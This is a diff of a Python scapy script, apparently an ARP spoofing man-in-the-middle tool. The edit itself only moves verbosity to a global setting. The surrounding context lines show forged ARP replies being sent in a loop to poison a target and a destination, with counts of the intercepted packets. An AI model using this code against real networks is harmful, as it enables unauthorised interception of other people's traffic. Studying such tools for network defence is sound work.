@@ -2,6 +2,7 @@
 #Created by PepeBigotes
 
 from scapy.all import *
+conf.verb = 0
 from time import sleep
 import os
 
@@ -25,7 +26,7 @@ def get_mac_from_ip(i_ip):
     fake_ip = IP(src=fake_ip).src
     pkt = Ether(dst='ff:ff:ff:ff:ff:ff') /\
           ARP(op=1, pdst=i_ip)
-    ans = srp1(pkt, timeout=3, retry=-2, verbose=0)
+    ans = srp1(pkt, timeout=3, retry=-2)
     if not ans: return None
     return ans[ARP].hwsrc
 
@@ -75,7 +76,7 @@ def handle_arp(pkt):
         pkt = Ether(src=T_SRC_MAC, dst=pkt[0].src) /\
               ARP(op=2, hwsrc=T_SRC_MAC, psrc=TRG_IP, hwdst=pkt[0].src, pdst=DST_IP)
 
-    sendp(pkt, verbose=0)
+    sendp(pkt)
 
 
 def handle_pkt(pkt):
@@ -95,7 +96,7 @@ def handle_pkt(pkt):
 
     else: return
 
-    sendp(pkt, verbose=0)
+    sendp(pkt)
 
 
 
@@ -111,8 +112,8 @@ pkt2 = Ether(src=T_SRC_MAC, dst=TRG_MAC) /\
 
 try:
     while True:
-        sendp(pkt1, verbose=0)
-        sendp(pkt2, verbose=0)
+        sendp(pkt1)
+        sendp(pkt2)
         print(f"Total {pkts_count} | {pkts_from_trg} from {TRG_IP} | {pkts_from_dst} from {DST_IP}", end='\r')
         sleep(0.5)
 except KeyboardInterrupt:
